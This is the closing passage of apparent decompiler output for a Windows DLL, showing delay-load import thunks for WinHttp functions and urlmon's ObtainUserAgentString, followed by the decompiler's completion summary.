{
  JUMPOUT(0x1000F51C);
}
// 1000F57F: control flows out of bounds to 1000F51C

//----- (1000F58A) --------------------------------------------------------
void WinHttpConnect_thunk()
{
  JUMPOUT(0x1000F51C);
}
// 1000F591: control flows out of bounds to 1000F51C

//----- (1000F59C) --------------------------------------------------------
void WinHttpOpen_thunk()
{
  JUMPOUT(0x1000F51C);
}
// 1000F5A3: control flows out of bounds to 1000F51C

//----- (1000F5AE) --------------------------------------------------------
void WinHttpCheckPlatform_thunk()
{
  JUMPOUT(0x1000F51C);
}
// 1000F5B5: control flows out of bounds to 1000F51C

//----- (1000F5C0) --------------------------------------------------------
int __fastcall ObtainUserAgentString_thunk(int a1, int a2)
{
  FARPROC v2; // eax

  v2 = sub_100083EA(&urlmon_dll_import_table, (int *)&ObtainUserAgentString);
  return ((int (__fastcall *)(int, int))v2)(a1, a2);
}
// 100116A8: using guessed type int urlmon_dll_import_table;

// nfuncs=494 queued=405 decompiled=405 lumina nreq=0 worse=0 better=0
// ALL OK, 405 function(s) have been successfully decompiled
